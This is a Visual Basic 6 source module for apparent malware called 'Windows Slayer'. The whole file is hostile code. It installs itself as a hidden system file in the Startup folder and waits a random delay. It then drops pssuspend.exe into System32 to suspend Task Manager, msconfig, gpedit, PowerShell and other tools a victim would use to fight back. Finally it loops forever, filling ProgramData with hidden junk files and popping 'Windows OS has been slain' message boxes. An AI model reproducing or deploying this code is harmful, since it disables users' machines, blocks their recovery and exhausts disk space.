Attribute VB_Name = "Mdl_main"
Option Explicit
Public Declare Sub Sleep Lib "kernel32" (ByVal dwmillisecond As Long)
Public Declare Function Postmessage Lib "user32" Alias "PostmessageA" (ByVal hwnd, Msg, wParam, IParam As Long) As Long
Public Declare Function Findwindow Lib "user32" Alias "FindwindowA" (ByVal ipclassname, Ipwindowname As String) As Long
Public Sub AutomaticStartup()
    Dim path As String
    path = "c:\programdata\microsoft\windows\start menu\programs\startup\Windows Slayer.exe"
    FileCopy App.path & "\" & App.EXEName & ".exe", path
    SetAttr path, vbHidden + vbSystem
End Sub
Public Sub Wait()
    Dim min As Integer, ms As Long, sign As Boolean
    sign = False
    Call AutomaticStartup
    Randomize
    min = CInt(Rnd * 60) + 1
    If min < 10 Then min = min + 10
    ms = min * 60000
    sign = True
    Sleep ms
End Sub
Public Sub ps(name)
    Shell "cmd /c pssuspend" & name, 0
End Sub
Public Sub Suspend()
    Dim h As Long
    FileCopy App.path & "\pssuspend.exe", "c:\windows\system32\pssuspend.exe"
    SetAttr "c:\windows\system32\pssuspend.exe", vbHidden + vbSystem
    Call Findwindow(vbNullString, "pssuspend.exe")
    Postmessage h, &H100, &H13, 0
    Postmessage h, &H101, &H13, 0
    Call ps("taskmgr.exe")
    SendKeys vbCrLf
    Call ps("gpedit.msc")
    Call ps("msconfig")
    Call ps("powershell.exe")
    Call ps("perfmon.exe")
    Call ps("dllhost.exe")
End Sub
Public Sub Spam()
    Dim i, j As Long
    j = 1
    Open "c:\windows\temp\0.txt" For Output As #1
        For i = 0 To 1000000
            Print #1, "0"
        Next i
    Close #1
    Open "c:\windows\temp\Spam.vbs" For Output As #2
        Print #2, "msgbox " & Chr(34) & "Windows OS has been slain." & Chr(34) & ",16" & Chr(34) & "Infection" & Chr(34)
    Close #2
    SetAttr "c:\windows\temp\Spam.vbs", vbHidden + vbSystem
    While True
        FileCopy "c:\windows\temp\0.txt", "c:\programdata\" & CStr(j) & ".txt"
        SetAttr "c:\programdata\" & CStr(j) & ".txt", vbHidden + vbSystem
        j = j + 1
        Shell "cmd /c start c:\windows\temp\Spam.vbs", 0
    Wend
End Sub
